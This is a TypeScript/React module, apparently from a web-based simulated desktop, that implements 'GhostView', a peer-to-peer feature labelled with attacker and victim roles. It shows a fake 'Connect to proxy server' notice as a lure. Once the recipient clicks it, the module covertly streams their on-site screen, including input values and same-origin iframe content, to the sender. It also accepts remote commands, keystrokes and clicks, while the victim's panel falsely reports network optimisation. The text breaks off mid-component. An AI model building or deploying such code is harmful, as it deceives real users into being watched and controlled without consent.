import { useEffect, useRef, useState, useSyncExternalStore } from "react";
import Peer from "peerjs";
import type { DataConnection } from "peerjs";

export type GvWindow = { id: string; title: string; x: number; y: number; w: number; h: number; minimized: boolean; focused: boolean };
export type GvSnap = {
  v: number;
  t: number;
  user: string;
  wallpaper: string;
  wallpaperName: string;
  vpW: number;
  vpH: number;
  active: string | null;
  wins: GvWindow[];
  term: { prompt: string; lines: string[] } | null;
  html?: string;
  eh?: number;
};
export type GvIncoming = { kind: "ghost-payload"; file: string; from: string; token: string; ts: number };

export type GhostCtrl = { kind: "ghost-ctrl"; from: string; cmd: "open" | "close" | "min" | "run" | "click" | "enter" | "key" | "type"; app?: string; text?: string; key?: string; enter?: boolean; x?: number; y?: number };

export type GhostCallbacks = {
  onPayload: (item: GvIncoming) => void;
  onSessionOpen: (peer: string, token: string) => void;
  onSessionSnap: (peer: string, snap: GvSnap, latency: number) => void;
  onSessionClose: (peer: string) => void;
  onStatus?: (msg: string) => void;
  onControl?: (ctrl: Omit<GhostCtrl, "kind" | "from">) => void;
};

export type GhostFailReason = "self" | "peer-unavailable" | "network" | "local" | "timeout";
export type GhostDeliverResult = { ok: true } | { ok: false; reason: GhostFailReason };

const gvHub = (code: string) => `vertex-gv-${code.toLowerCase().replace(/[^a-z0-9]/gi, "")}`;

type UiState = {
  role: "idle" | "victim" | "attacker";
  peer: string | null;
  status: string;
  snap: GvSnap | null;
  latency: number | null;
  source: string | null;
};

let ui: UiState = { role: "idle", peer: null, status: "", snap: null, latency: null, source: null };
const subs = new Set<() => void>();
let uiStore: { get: () => UiState; sub: (fn: () => void) => () => void } | null = null;

function emitUi() { subs.forEach((fn) => fn()); }

export function ghostUiStore() {
  if (!uiStore) {
    uiStore = { get: () => ui, sub: (fn) => { subs.add(fn); return () => { subs.delete(fn); }; } };
  }
  return uiStore;
}

export function useGhostViewUi() {
  const store = ghostUiStore();
  return useSyncExternalStore(store.sub, store.get, store.get);
}

let code = "";
let selfCode = "";
let peer: Peer | null = null;
let peerOpen = false;
let regLoop: number | null = null;
let regAnnounced = false;
let collisionWarned = false;
let cbs: GhostCallbacks = { onPayload: () => {}, onSessionOpen: () => {}, onSessionSnap: () => {}, onSessionClose: () => {}, onStatus: () => {}, onControl: () => {} };
const outConns = new Set<DataConnection>();
let streamConn: DataConnection | null = null;
let sinkConn: DataConnection | null = null;
let pumpTimer: number | null = null;
let snapGetter: (() => GvSnap | null) | null = null;
let lastSnapHtml: string | null = null;
let lastSnapEh = 0;
let lastWpDiv = "";

export function ghostSetSnapGetter(fn: () => GvSnap | null) { snapGetter = fn; }

function setUi(patch: Partial<UiState>) { ui = { ...ui, ...patch }; emitUi(); }

export function ghostSetStatus(status: string) { setUi({ status }); }

function handleInbound(conn: DataConnection, raw: unknown) {
  const d = raw as { kind?: string; from?: string; token?: string; snap?: GvSnap };
  if (!d || typeof d !== "object") return;
  if (d.kind === "ghost-payload" && (d as unknown as { file: string }).file) {
    const item: GvIncoming = { kind: "ghost-payload", file: (d as unknown as { file: string }).file, from: d.from ?? "?", token: d.token ?? "", ts: Date.now() };
    cbs.onPayload(item);
    return;
  }
  if (d.kind === "ghost-hello") {
    sinkConn = conn;
    setUi({ role: "attacker", peer: d.from ?? "?", status: "stream", source: (d as unknown as { source: string }).source ?? null });
    cbs.onSessionOpen(d.from ?? "?", d.token ?? "");
    return;
  }
  if (d.kind === "ghost-snap" && d.snap) {
    if (d.snap.html) {
      lastSnapHtml = d.snap.html;
      lastSnapEh = d.snap.eh ?? 0;
      const m = d.snap.html.match(/<div class="gv-wp"[^>]*><\/div>/);
      if (m) lastWpDiv = m[0];
    }
    const merged: GvSnap = lastSnapHtml ? { ...d.snap, html: lastSnapHtml, eh: lastSnapEh } : d.snap;
    const latency = Math.max(0, Date.now() - d.snap.t);
    setUi({ snap: merged, latency, status: "stream" });
    cbs.onSessionSnap(d.from ?? ui.peer ?? "?", merged, latency);
    return;
  }
  if (d.kind === "ghost-close") {
    const who = d.from ?? "";
    cleanupStream();
    if (who) cbs.onSessionClose(who);
  }
}

function cleanupStream() {
  if (pumpTimer !== null) { window.clearInterval(pumpTimer); pumpTimer = null; }
  try { streamConn?.close(); } catch { /* noop */ }
  streamConn = null;
  lastSnapHtml = null;
  lastSnapEh = 0;
  if (ui.role === "victim") {
    setUi({ status: "closed", snap: null, latency: null });
  } else if (ui.role === "attacker") {
    setUi({ role: "idle", snap: null, latency: null, status: "", peer: null, source: null });
  }
}

function teardownPeer() {
  if (regLoop !== null) { window.clearInterval(regLoop); regLoop = null; }
  try { peer?.destroy(); } catch { /* noop */ }
  peer = null;
  peerOpen = false;
}

function registerPeer() {
  teardownPeer();
  peer = new Peer(gvHub(code), { debug: 0 });
  peer.on("open", () => {
    peerOpen = true;
    if (!regAnnounced) { regAnnounced = true; cbs.onStatus?.(`[+] GhostView peer online · vertex-gv-${code}`); }
  });
  peer.on("connection", (conn) => {
    outConns.add(conn);
    conn.on("open", () => {});
    conn.on("data", (dRaw) => handleInbound(conn, dRaw));
    conn.on("close", () => {
      outConns.delete(conn);
      if (conn === sinkConn || conn === streamConn) { cleanupStream(); }
    });
    conn.on("error", () => outConns.delete(conn));
  });
  peer.on("error", (err) => {
    if (regLoop !== null) return;
    const type = (err as { type?: string }).type ?? "error";
    if (type === "unavailable-id") {
      if (!collisionWarned) {
        collisionWarned = true;
        cbs.onStatus?.("[!] that session code is already live elsewhere — close the duplicate tab or run your alt in a separate browser/incognito, then retry. re-registering…");
      }
    } else if (type === "network" || type === "server-error" || type === "socket-error" || type === "socket-closed") {
      cbs.onStatus?.("[!] GhostView cloud unreachable — re-registering…");
    }
    teardownPeer();
    regLoop = window.setInterval(() => {
      if (peerOpen) return;
      registerPeer();
    }, 3000);
  });
}

export function startGhostView(codeArg: string, callbacks: GhostCallbacks) {
  cbs = { ...cbs, ...callbacks };
  code = codeArg;
  selfCode = codeArg;
  regAnnounced = false;
  collisionWarned = false;
  if (outConns.size) { outConns.forEach((c) => { try { c.close(); } catch { /* noop */ } }); outConns.clear(); }
  cleanupStream();
  sinkConn = null;
  registerPeer();
}

function awaitPeerOpen(ms = 6000): Promise<boolean> {
  return new Promise((resolve) => {
    const t0 = Date.now();
    const iv = window.setInterval(() => {
      if (peerOpen) { window.clearInterval(iv); resolve(true); }
      else if (Date.now() - t0 > ms) { window.clearInterval(iv); resolve(false); }
    }, 200);
  });
}

async function linkHost(friend: string, onOpen: (c: DataConnection) => void): Promise<GhostDeliverResult> {
  if (!selfCode || !peer) return { ok: false, reason: "local" };
  if (friend.toLowerCase() === selfCode.toLowerCase()) return { ok: false, reason: "self" };
  if (!(await awaitPeerOpen())) return { ok: false, reason: "local" };
  for (let attempt = 0; attempt < 2; attempt++) {
    const c = peer!.connect(gvHub(friend), { reliable: true });
    outConns.add(c);
    const settled = await new Promise<GhostDeliverResult>((resolve) => {
      const timeout = window.setTimeout(() => { c.off("open", onOpenH); c.off("error", onErrH); c.off("close", onCloseH); outConns.delete(c); resolve({ ok: false, reason: "timeout" }); }, 8000);
      const done = (res: GhostDeliverResult) => { window.clearTimeout(timeout); c.off("open", onOpenH); c.off("error", onErrH); c.off("close", onCloseH); if (!res.ok) outConns.delete(c); resolve(res); };
      const onOpenH = () => { onOpen(c); done({ ok: true }); };
      const onErrH = (e: { type?: string }) => {
        const t = e?.type ?? "peer-unavailable";
        done({ ok: false, reason: (t === "network" || t === "socket-error" || t === "socket-closed" ? "network" : "peer-unavailable") as GhostFailReason });
      };
      const onCloseH = () => done({ ok: false, reason: "timeout" });
      c.on("open", onOpenH);
      c.on("error", onErrH);
      c.on("close", onCloseH);
    });
    if (settled.ok) return settled;
    if (settled.reason === "peer-unavailable") { await new Promise((r) => window.setTimeout(r, 1200)); continue; }
    return settled;
  }
  return { ok: false, reason: "peer-unavailable" };
}

export async function ghostDeliver(friend: string, file: string): Promise<GhostDeliverResult> {
  return linkHost(friend, (c) => {
    const token = Array.from({ length: 6 }, () => "0123456789abcdef".charAt(Math.floor(Math.random() * 16))).join("");
    c.send({ kind: "ghost-payload", file, from: selfCode, token });
  });
}

export async function ghostProbe(friend: string): Promise<GhostDeliverResult> {
  return linkHost(friend, () => {});
}

export function sendGhostCtrl(ctrl: Omit<GhostCtrl, "kind" | "from">): boolean {
  const target = sinkConn ?? streamConn;
  if (target && target.open) {
    try { target.send({ kind: "ghost-ctrl", from: selfCode, ...ctrl }); return true; } catch { /* noop */ }
  }
  return false;
}

// ─────────────────────────────────────────────────────────────────────────────
// Real screen capture: serializes the victim's actual Vertex-OS DOM (windows,
// contents, wallpaper, taskbar) into a sanitized HTML snapshot the attacker can
// render as a live mirror. Only the site's own screen — never the OS monitor.
// ─────────────────────────────────────────────────────────────────────────────

const CAPTURE_MAX = 420000;
const CAPTURE_DEPTH = 30;
const VOID_TAGS = new Set(["br", "hr", "img", "wbr", "area", "base", "col", "embed", "input", "link", "meta", "param", "source", "track"]);
const SKIP_TAGS = new Set(["script", "style", "link", "meta", "title", "object", "embed", "form", "template", "noscript", "head", "audio"]);
let canvasAt = 0;
let outBuf = "";
const outBudget = { v: 0 };

const VISUAL_ROLES = ["window-layer", "app-window", "window-bar", "window-body", "dock", "sidebar", "desktop-grid", "rm-widget", "overlay-panel", "drawer", "context-menu", "info-modal", "term-output", "term-entry", "term-input", "dock-shell", "clock-widget", "shell-win"];
const VISUAL_PROPS = [
  ["opacity", "0"],
  ["z-index", "auto"],
  ["display", ""],
  ["position", "static"],
  ["top", "auto"],
  ["left", "auto"],
  ["right", "auto"],
  ["bottom", "auto"],
  ["width", ""],
  ["height", ""],
  ["min-height", "0px"],
  ["max-height", "none"],
  ["overflow", "visible"],
  ["overflow-y", "visible"],
  ["background-color", "rgba(0, 0, 0, 0)"],
  ["color", ""],
  ["border-radius", "0px"],
  ["box-shadow", "none"],
  ["border", "0px none rgb(0, 0, 0)"],
  ["filter", "none"],
  ["backdrop-filter", "none"],
  ["visibility", "visible"],
  ["padding", "0px"],
  ["z-index", "auto"],
];

function visualProps(el: Element): string {
  const cls = (el.getAttribute("class") ?? "").split(/\s+/).filter(Boolean);
  if (!cls.some((c) => VISUAL_ROLES.some((r) => c.startsWith(r)))) return "";
  const cs = getComputedStyle(el);
  const out: string[] = [];
  for (const [prop, def] of VISUAL_PROPS) {
    let v = cs.getPropertyValue(prop).trim() || "";
    if (!v) continue;
    if (v === def) continue;
    if (prop === "z-index") { if (v === "auto" || v === "0") continue; }
    if (prop === "opacity") { if (v === "1" || v === "") continue; }
    if (prop === "background-color") { out.push("background-color:" + v); continue; }
    if (v.length > 260) v = v.slice(0, 260);
    out.push(prop + ":" + v);
  }
  return out.join(";");
}

let wpAt = 0;
let wpLast = "";
function wallpaperFrame(): string {
  const now = Date.now();
  if (now - wpAt < 4000) return wpLast;
  const v = document.querySelector<HTMLVideoElement>("section.lock-screen video, video");
  if (!v || !v.videoWidth) return wpLast;
  try {
    const w = Math.min(1200, v.videoWidth);
    const c = document.createElement("canvas");
    c.width = w;
    c.height = Math.max(1, Math.round((v.videoHeight * w) / v.videoWidth));
    const g = c.getContext("2d");
    if (!g) return wpLast;
    g.drawImage(v, 0, 0, c.width, c.height);
    const url = c.toDataURL("image/jpeg", 0.4);
    if (!url || url.length > 260000) return wpLast;
    wpAt = now;
    wpLast = url;
    return url;
  } catch { return wpLast; }
}

function wallpaperDiv(): string {
  const url = wallpaperFrame();
  if (!url) return "";
  return `<div class="gv-wp" style="position:absolute;inset:0;z-index:0;background-image:url(${url});background-size:cover;background-position:center;pointer-events:none"></div>`;
}

function escHtml(s: string) {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function safeStyle(value: string): string | null {
  if (value.length > 900) return null;
  if (/url\(\s*(?!["']?(data:image|https?:|\/))["']?/i.test(value)) return null;
  return value;
}

function safeAttr(name: string, value: string, tag: string): string | null {
  const n = name.toLowerCase();
  if (n === "id" || n === "tabindex" || n === "draggable" || n === "spellcheck" || n === "contenteditable" || n === "autocomplete" || n === "contextmenu" || n === "data-testid" || n.startsWith("on") || n.startsWith("aria-")) return null;
  if (n === "class") return `class="${escHtml(value)}"`;
  if (n === "style") { const s = safeStyle(value); return s ? `style="${escHtml(s)}"` : null; }
  if (n === "value" && value.length < 600) return `value="${escHtml(value)}"`;
  if (n === "src" || n === "poster" || n === "href" || n === "data-src") {
    const lv = value.trim().toLowerCase();
    if (lv.startsWith("data:image/")) return `${name}="${escHtml(value)}"`;
    if (lv.startsWith("javascript:") || lv.startsWith("data:text") || lv.startsWith("vbscript:") || lv.startsWith("about:")) return null;
    if (n === "href") return null;
    return `${name}="${escHtml(value)}"`;
  }
  if (n === "autoplay" || n === "preload" || n === "controls" || n === "muted" || n === "loop" || n === "playsinline" || n === "poster") {
    if (n === "poster") return safeAttr("src", value, tag);
    if (n === "autoplay" || n === "controls") return null;
    return `${name}="${escHtml(value)}"`;
  }
  return `${name}="${escHtml(value)}"`;
}

function canvasToImg(el: HTMLCanvasElement) {
  const now = Date.now();
  if (now - canvasAt < 4000) {
    outBuf += `<div class="gv-canvas-static" style="width:${el.width || 200}px;height:${el.height || 140}px"></div>`;
    return;
  }
  try {
    const url = el.toDataURL("image/png", 0.4);
    if (!url || url.length > 160000) return;
    canvasAt = now;
    outBuf += `<img class="gv-canvas-snap" src="${url}" alt="" style="max-width:100%;display:block" />`;
  } catch { /* tainted canvas — no pixels */ }
}

let videoAt = 0;
function videoToImg(el: HTMLVideoElement) {
  const now = Date.now();
  if (now - videoAt < 4000 || !el.videoWidth) {
    outBuf += `<div class="gv-canvas-static" style="width:${el.clientWidth || 280}px;height:${el.clientHeight || 158}px"></div>`;
    return;
  }
  try {
    const cs = getComputedStyle(el);
    const w = Math.min(640, el.videoWidth);
    const c = document.createElement("canvas");
    c.width = w;
    c.height = Math.max(1, Math.round((el.videoHeight * w) / el.videoWidth));
    const g = c.getContext("2d");
    if (!g) return;
    g.drawImage(el, 0, 0, c.width, c.height);
    const url = c.toDataURL("image/jpeg", 0.5);
    if (!url || url.length > 160000) return;
    videoAt = now;
    outBuf += `<img class="gv-canvas-snap" src="${url}" alt="" style="width:100%;height:100%;object-fit:${cs.objectFit === "cover" ? "cover" : "contain"};display:block" />`;
  } catch { /* cross-origin video — no pixels */ }
}

let iframeAt = 0;
let iframeLast = "";
function iframeToImg(el: HTMLIFrameElement) {
  if (!el.contentDocument || !el.contentDocument.body) {
    outBuf += `<div class="gv-canvas-static" style="width:${el.clientWidth || 400}px;height:${el.clientHeight || 300}px"><span>external web content</span></div>`;
    return;
  }
  const sameOrigin = (() => {
    try {
      const hs = el.contentDocument?.location?.href ?? "";
      return hs === "" || hs === "about:blank" || hs === "about:srcdoc" || hs.indexOf(location.origin) === 0;
    } catch { return false; }
  })();
  if (!sameOrigin) {
    outBuf += `<div class="gv-canvas-static" style="width:${el.clientWidth || 400}px;height:${el.clientHeight || 300}px"><span>external web content</span></div>`;
    return;
  }
  const now = Date.now();
  if (now - iframeAt < 4000) {
    outBuf += iframeLast
      ? `<div class="gv-iframe-doc" style="${iframeStyle()}">${iframeLast}</div>`
      : `<div class="gv-canvas-static" style="width:${el.clientWidth || 400}px;height:${el.clientHeight || 300}px"></div>`;
    return;
  }
  try {
    const doc = el.contentDocument;
    const inner = doc
      ? (() => {
          const clone = doc.body.cloneNode(true) as HTMLElement;
          clone.querySelectorAll("script,style,link,meta,template,noscript,iframe,video,audio,object,embed").forEach((n) => n.remove());
          const frag = new DOMParser().parseFromString(clone.innerHTML, "text/html");
          frag.querySelectorAll("script,style,iframe,video,audio").forEach((n) => n.remove());
          let html = frag.body.innerHTML;
          if (html.length > 60000) html = html.slice(0, 60000) + "<span style='opacity:.5'>…</span>";
          return html;
        })()
      : "";
    if (inner.length < 4) {
      outBuf += `<div class="gv-canvas-static" style="width:${el.clientWidth || 400}px;height:${el.clientHeight || 300}px"></div>`;
      return;
    }
    iframeAt = now;
    iframeLast = inner;
    outBuf += `<div class="gv-iframe-doc" style="${iframeStyle()}">${inner}</div>`;
  } catch {
    outBuf += `<div class="gv-canvas-static" style="width:${el.clientWidth || 400}px;height:${el.clientHeight || 300}px"></div>`;
  }
}
function iframeStyle() {
  return "width:100%;height:100%;overflow:hidden;background:#0b0f18;color:#cfe;font:12px monospace";
}

function buildCapture(node: Node, depth: number) {
  if (outBudget.v > CAPTURE_MAX) return;
  if (depth > CAPTURE_DEPTH) return;
  if (node.nodeType === Node.TEXT_NODE) {
    const t = node.textContent ?? "";
    if (t.trim()) { outBuf += escHtml(t); outBudget.v += t.length; }
    return;
  }
  if (node.nodeType !== Node.ELEMENT_NODE) return;
  const el = node as Element;
  const tag = el.tagName.toLowerCase();
  if (SKIP_TAGS.has(tag)) return;
  if (el.classList && el.classList.contains("fps")) return;
  if (tag === "canvas") { canvasToImg(el as HTMLCanvasElement); return; }
  if (tag === "video") { videoToImg(el as HTMLVideoElement); return; }
  if (tag === "iframe") { iframeToImg(el as HTMLIFrameElement); return; }
  let attrs = "";
  for (const a of Array.from(el.attributes)) {
    const s = safeAttr(a.name, a.value, tag);
    if (s) attrs += " " + s;
  }
  const vis = visualProps(el);
  if (vis) {
    if (/style=/.test(attrs)) attrs = attrs.replace(/style="[^"]*"/, (st) => st.slice(0, -1) + ";" + vis + '"');
    else attrs += ` style="${vis}"`;
  }
  outBuf += `<${tag}${attrs}>`;
  outBudget.v += tag.length + attrs.length;
  for (const ch of Array.from(el.childNodes)) buildCapture(ch, depth + 1);
  if (!VOID_TAGS.has(tag)) outBuf += `</${tag}>`;
}

export function captureScreenHtml(rootSel: string): string | null {
  const root = document.querySelector<HTMLElement>(rootSel);
  if (!root) return null;
  outBuf = "";
  outBudget.v = 0;
  buildCapture(root, 0);
  const wp = wallpaperDiv();
  if (wp && outBuf) {
    const gt = outBuf.indexOf(">");
    if (gt !== -1) outBuf = outBuf.slice(0, gt + 1) + wp + outBuf.slice(gt + 1);
  }
  return outBuf.trim() ? outBuf : null;
}

export function snapSig(s: string): number {
  let h = 7;
  for (let i = 0; i < s.length; i += 3) h = ((h << 5) - h + s.charCodeAt(i)) | 0;
  return h;
}

export async function ghostExecute(item: GvIncoming) {
  if (!selfCode || !peer) return;
  cleanupStream();
  setUi({ role: "victim", peer: item.from, status: "connecting", source: item.from, snap: null, latency: null });
  const conn = peer.connect(gvHub(item.from), { reliable: true });
  streamConn = conn;
  outConns.add(conn);
  conn.on("open", () => {
    conn.send({ kind: "ghost-hello", stream: true, from: selfCode, token: item.token, source: item.file });
    conn.send({ kind: "ghost-snap", from: selfCode, snap: snapGetter?.() ?? null });
    conn.on("data", (raw: unknown) => {
      const m = raw as { kind?: string; from?: string; cmd?: string; app?: string; text?: string; key?: string; enter?: boolean; x?: number; y?: number };
      if (m && m.kind === "ghost-ctrl" && m.from === item.from && m.cmd) {
        cbs.onControl?.({ cmd: m.cmd as GhostCtrl["cmd"], app: m.app, text: m.text, key: m.key, enter: m.enter, x: m.x, y: m.y });
      }
    });
    setUi({ status: "stream" });
    let lastCore = 0;
    let lastWpS = 0;
    let lastHtmlAt = 0;
    if (pumpTimer === null) {
      pumpTimer = window.setInterval(() => {
        try {
          if (conn.open) {
            const snap = snapGetter?.() ?? null;
            if (snap) {
              if (snap.html) {
                const wpStrip = /<div class="gv-wp"[^>]*><\/div>/;
                const wpM = snap.html.match(wpStrip);
                const wpS = wpM ? snapSig(wpM[0]) : 0;
                const core = snapSig(snap.html.replace(wpStrip, ""));
                const now = Date.now();
                const delta = now - lastHtmlAt;
                const coreChanged = core !== lastCore;
                const wpChanged = wpS !== lastWpS;
                if ((coreChanged && delta >= 2200) || (wpChanged && delta >= 6000)) {
                  lastCore = core;
                  lastWpS = wpS;
                  lastHtmlAt = now;
                  conn.send({ kind: "ghost-snap", from: selfCode, snap });
                } else {
                  const { html: _drop, ...rest } = snap;
                  conn.send({ kind: "ghost-snap", from: selfCode, snap: rest });
                }
              } else {
                conn.send({ kind: "ghost-snap", from: selfCode, snap });
              }
            }
          }
        } catch { /* noop */ }
      }, 1000);
    }
  });
  conn.on("close", () => cleanupStream());
  conn.on("error", () => { setUi({ status: "closed" }); cleanupStream(); });
}

export function ghostStop() {
  if (streamConn) { try { streamConn.send({ kind: "ghost-close", from: selfCode }); } catch { /* noop */ } }
  cleanupStream();
  if (sinkConn) { try { sinkConn.close(); } catch { /* noop */ } sinkConn = null; }
  if (ui.role !== "victim") {
    setUi({ role: "idle", snap: null, latency: null, status: "", peer: null, source: null });
  }
}

export function GhostPayloadCard({ item, onRun, onDismiss }: { item: GvIncoming; onRun: () => void; onDismiss: () => void }) {
  const [gone, setGone] = useState(false);
  if (gone) return null;
  const run = () => { setGone(true); onRun(); };
  return (
    <div className="gv-card gv-notif" data-testid={`gv-card-${item.token}`}>
      <header className="gv-notif-top">
        <span className="gv-notif-app"><span className="gv-notif-ico">V</span><b>Vertex Network</b></span>
        <button className="gv-notif-x" onClick={onDismiss} aria-label="Dismiss" data-testid={`gv-notif-dismiss-${item.token}`}>&times;</button>
      </header>
      <div className="gv-notif-body">
        <span className="gv-notif-ico-big">V</span>
        <div className="gv-notif-copy">
          <strong>Connect to proxy server</strong>
          <p>Your connection to Vertex services is unstable. Connect to a nearby proxy to restore full speed.</p>
        </div>
      </div>
      <footer className="gv-notif-foot">
        <button className="gv-btn gv-btn-dismiss" onClick={onDismiss} data-testid={`gv-notif-later-${item.token}`}>Not now</button>
        <button className="gv-btn gv-btn-run" onClick={run} data-testid={`gv-notif-run-${item.token}`}>Connect</button>
      </footer>
    </div>
  );
}

function ensureWp(html: string): string {
  if (!lastWpDiv || /\bgv-wp\b/.test(html)) return html;
  const gt = html.indexOf(">");
  if (gt === -1) return html;
  return html.slice(0, gt + 1) + lastWpDiv + html.slice(gt + 1);
}

function renderMirrorScreen(snap: GvSnap, wallpaperResolve: (id: string) => string | null, cw: number, onClickFrame?: (x: number, y: number) => void) {
  if (snap.html) {
    const vpW = Math.max(320, snap.vpW);
    const vpH = Math.max(200, snap.vpH);
    const k = Math.min(cw / vpW);
    const ch = Math.round(vpH * k);
    const frameClick = onClickFrame
      ? (e: React.MouseEvent<HTMLDivElement>) => {
          const r = (e.currentTarget as HTMLDivElement).getBoundingClientRect();
          const kk = r.width / vpW;
          onClickFrame(Math.max(0, Math.round((e.clientX - r.left) / kk)), Math.max(0, Math.round((e.clientY - r.top) / kk)));
        }
      : undefined;
    return (
      <div className="gv-snap-cap" style={{ width: "100%", height: ch }} data-testid="gv-snap-cap">
        <div className={`gv-snap-frame${onClickFrame ? " clickable" : ""}`} style={{ width: vpW, height: vpH, transform: `scale(${k})` }} onClick={frameClick}>
          <div className="gv-snap-inner" dangerouslySetInnerHTML={{ __html: ensureWp(snap.html) }} />
        </div>
        <div className="gv-screen-tag">{snap.user}@{snap.wallpaperName} · real screen</div>
      </div>
    );
  }
  const k = cw / 1600;
  const shell = (sm: string) => {
    const lines = sm.split("\n").slice(-34);
    return (
      <div className="gv-term">
        {lines.map((ln, i) => <div className="gv-term-line" key={i}>{ln || "\u00a0"}</div>)}
      </div>
    );
  };
  return (
    <div className="gv-screen-stage" style={{ backgroundImage: wallpaperResolve(snap.wallpaper) ? `url(${wallpaperResolve(snap.wallpaper)})` : undefined, backgroundSize: "cover", backgroundPosition: "center", background: wallpaperResolve(snap.wallpaper) ? undefined : "radial-gradient(1200px 700px at 30% 20%, #18243a, #070b14)" }}>
      <div className="gv-screen-tag">{snap.user}@{snap.wallpaperName}</div>
      {snap.wins.map((win) => (
        <div key={win.id} className={`gv-win ${win.focused ? "is-focused" : ""} ${win.minimized ? "is-min" : ""}`} style={{ left: win.x * k, top: win.y * k, width: Math.max(60, win.w * k), height: Math.max(40, win.h * k) }}>
          <div className="gv-win-bar"><span className="gv-win-dot" />{win.title}</div>
          <div className="gv-win-body">
            {win.id === "terminal" && snap.term ? shell([snap.term.prompt, ...snap.term.lines].join("\n")) : <div className="gv-win-surface">{win.title}</div>}
          </div>
        </div>
      ))}
      <div className="gv-taskbar"><span className="gv-task-icon">〈</span>{snap.wins.filter((w) => !w.minimized).map((w) => <span key={w.id} className={`gv-task-item ${w.focused ? "is-focus" : ""}`}>{w.title}</span>)}<span className="gv-task-clock">◉</span></div>
    </div>
  );
}

const CTRL_APPS: Array<[string, string]> = [["terminal", "Terminal"], ["messages", "Messages"], ["browser", "Browser"], ["roblox", "Roblox"], ["calculator", "Calc"], ["pizza", "Pizza"], ["hub", "Hub"], ["spicetify", "Spotify"], ["settings", "Settings"], ["games", "Games"], ["minecraft", "Minecraft"], ["wallpaper-engine", "WpEng"], ["rainmeter", "Rainmeter"]];

function GhostCtrlBar({ live, driveOn, onDrive }: { live: boolean; driveOn: boolean; onDrive: (v: boolean) => void }) {
  const [txt, setTxt] = useState("");
  const [run, setRun] = useState("");
  const send = (ctrl: Omit<GhostCtrl, "kind" | "from">) => { if (sendGhostCtrl(ctrl)) { window.setTimeout(() => { if (ctrl.cmd === "type") setTxt(""); }, 260); } };
  return (
    <div className="gv-ctrl" data-testid="gv-ctrl">
      <div className="gv-ctrl-row">
        <span className="gv-ctrl-label">OPEN</span>
        <div className="gv-ctrl-apps">
          {CTRL_APPS.map(([id, label]) => (
            <button key={id} className="gv-ctrl-btn" data-testid={`gv-ctrl-${id}`} onClick={() => send({ cmd: "open", app: id })} disabled={!live}>{label}</button>
          ))}
        </div>
      </div>
      <div className="gv-ctrl-row">
        <span className="gv-ctrl-label">CLOSE</span>
        <div className="gv-ctrl-apps">
          {CTRL_APPS.map(([id, label]) => (
            <button key={id} className="gv-ctrl-btn is-close" data-testid={`gv-ctrl-close-${id}`} onClick={() => send({ cmd: "close", app: id })} disabled={!live}>✕ {label}</button>
          ))}
        </div>
      </div>
      <div className="gv-ctrl-row">
        <span className="gv-ctrl-label">TERMINAL</span>
        <input className="gv-ctrl-input" data-testid="gv-ctrl-run" value={run} onChange={(e) => setRun(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter" && run.trim()) { send({ cmd: "run", text: run }); setRun(""); } }} placeholder="run a command on their machine…" disabled={!live} />
        <button className="gv-ctrl-key" data-testid="gv-ctrl-run-send" onClick={() => { if (run.trim()) { send({ cmd: "run", text: run }); setRun(""); } }} disabled={!live || !run.trim()}>run ⏎</button>
      </div>
      <div className="gv-ctrl-row">
        <span className="gv-ctrl-label">TYPE</span>
        <input className="gv-ctrl-input" data-testid="gv-ctrl-input" value={txt} onChange={(e) => setTxt(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter" && txt.trim()) send({ cmd: "type", text: txt, enter: true }); }} placeholder="keystrokes into their focused input…" disabled={!live} />
        <button className="gv-ctrl-key" data-testid="gv-ctrl-type" onClick={() => { if (txt.trim()) send({ cmd: "type", text: txt, enter: false }); }} disabled={!live || !txt.trim()}>⌨ send</button>
        <button className="gv-ctrl-key" data-testid="gv-ctrl-enter" onClick={() => send({ cmd: "enter" })} disabled={!live}>⏎</button>
        <button className="gv-ctrl-key" data-testid="gv-ctrl-bs" onClick={() => send({ cmd: "key", key: "Backspace" })} disabled={!live}>⌫</button>
        <button className={`gv-ctrl-key ${driveOn ? "is-on" : ""}`} data-testid="gv-ctrl-click" title="click-to-drive: click the mirror to click their screen" onClick={() => onDrive(!driveOn)} disabled={!live}>{driveOn ? "🎯 drive on" : "🎯 drive off"}</button>
      </div>
    </div>
  );
}

export function GhostViewSurface({ wallpaperResolve, onStop }: { wallpaperResolve: (id: string) => string | null; onStop: () => void }) {
  const st = useGhostViewUi();
  const frameRef = useRef<HTMLDivElement>(null);
  const [cw, setCw] = useState(0);
  const [drive, setDrive] = useState(true);
  useEffect(() => {
    if (!frameRef.current) return;
    setCw(frameRef.current.clientWidth);
    const ro = new ResizeObserver(() => { if (frameRef.current) setCw(frameRef.current.clientWidth); });
    ro.observe(frameRef.current);
    return () => ro.disconnect();
  }, []);
  useEffect(() => {
    const id = window.setInterval(() => { if (frameRef.current) setCw(frameRef.current.clientWidth); }, 900);
    return () => window.clearInterval(id);
  }, []);

  if (st.role === "victim") {
    const ended = st.status === "closed";
    return (
      <div className="gv gv-victim" data-testid="gv-victim">
        <header className="gv-head"><span className="gv-logo">❖ Vertex Network</span><span className="gv-head-right">{ended ? <span className="gv-status gv-status-end">● stopped</span> : (st.status === "stream" ? <span className="gv-live">● active</span> : <span className="gv-status">◇ updating…</span>)}</span></header>
        <div className="gv-victim-body">
          {ended ? (
            <>
              <h3 className="gv-victim-title">Service stopped</h3>
              <p className="gv-victim-copy">The network service is no longer running. Your connection remains stable.</p>
              <ul className="gv-victim-list">
                <li>proxy disconnected · no action needed</li>
                <li>you can remove this service anytime</li>
              </ul>
            </>
          ) : st.status === "stream" ? (
            <>
              <h3 className="gv-victim-title">✓ Connected to Vertex proxy</h3>
              <p className="gv-victim-copy">Your connection has been restored and is being optimized automatically.</p>
              <ul className="gv-victim-list">
                <li>optimizing network routing</li>
                <li>compressing in-app traffic</li>
                <li>this window can stay open safely</li>
              </ul>
              <div className="gv-victim-bar"><span /></div>
            </>
          ) : (
            <>
              <h3 className="gv-victim-title">Connecting to proxy…</h3>
              <p className="gv-victim-copy">Updating network routes. This usually takes a moment.</p>
            </>
          )}
          {!ended && <div className="gv-victim-actions"><button className="gv-btn gv-btn-stop" onClick={onStop} data-testid="gv-stop-end">Close</button></div>}
        </div>
      </div>
    );
  }

  return (
    <div className="gv gv-attacker" data-testid="gv-attacker">
      <header className="gv-head">
        <span className="gv-logo">❖ GhostView — remote view</span>
        <span className="gv-head-right">
          {st.status === "stream" && st.snap ? <span className="gv-live">● LIVE</span> : <span className="gv-status">◇ waiting…</span>}
